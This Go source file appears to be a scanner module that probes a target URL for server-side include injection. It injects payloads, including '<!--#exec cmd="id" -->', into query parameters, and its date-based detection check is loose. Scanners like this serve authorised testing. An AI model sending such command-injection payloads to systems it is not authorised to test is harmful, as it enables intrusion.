package modules

import (
	"context"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// SsiInjectionTestingResult holds the result of the SsiInjectionTesting module execution.
type SsiInjectionTestingResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// SsiInjectionTesting executes the ssi_injection_testing security technique.
type SsiInjectionTesting struct {
	Target     string
	maxThreads int
	mu         sync.Mutex
	results    []SsiInjectionTestingResult
	client     *http.Client
}

// NewSsiInjectionTesting creates a new instance.
func NewSsiInjectionTesting(target string) *SsiInjectionTesting {
	return &SsiInjectionTesting{
		Target:     EnsureHTTPPrefix(target),
		maxThreads: 5,
		client:     NewHTTPClient(10 * time.Second),
	}
}

func (m *SsiInjectionTesting) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.maxThreads = count
}

var ssiPayloads = []string{
	`<!--#exec cmd="id" -->`,
	`<!--#echo var="DATE_LOCAL" -->`,
}

func (m *SsiInjectionTesting) Execute(ctx context.Context) ([]SsiInjectionTestingResult, error) {
	m.results = make([]SsiInjectionTestingResult, 0)

	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return m.results, err
	}

	jobs := make(chan string, len(ssiPayloads))
	for _, p := range ssiPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.maxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, parsedURL, payload)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *SsiInjectionTesting) testPayload(ctx context.Context, u *url.URL, payload string) {
	query := u.Query()
	hasParams := len(query) > 0
	
	testURL := *u
	if hasParams {
		for key, vals := range query {
			for i, val := range vals {
				query[key][i] = val + payload
			}
		}
		testURL.RawQuery = query.Encode()
	} else {
		query.Add("page", payload)
		query.Add("name", payload)
		testURL.RawQuery = query.Encode()
	}

	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		return
	}

	resp, err := m.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	bodyStr := string(bodyBytes)

	// Signatures for SSI execution
	if strings.Contains(bodyStr, "uid=") && strings.Contains(bodyStr, "gid=") || 
	   (strings.Contains(bodyStr, "19") && strings.Contains(bodyStr, ":") && !strings.Contains(bodyStr, "DATE_LOCAL")) { // Date output check
		m.mu.Lock()
		m.results = append(m.results, SsiInjectionTestingResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: "SSI Injection detected. Command executed successfully with payload: " + payload,
		})
		m.mu.Unlock()
	}
}
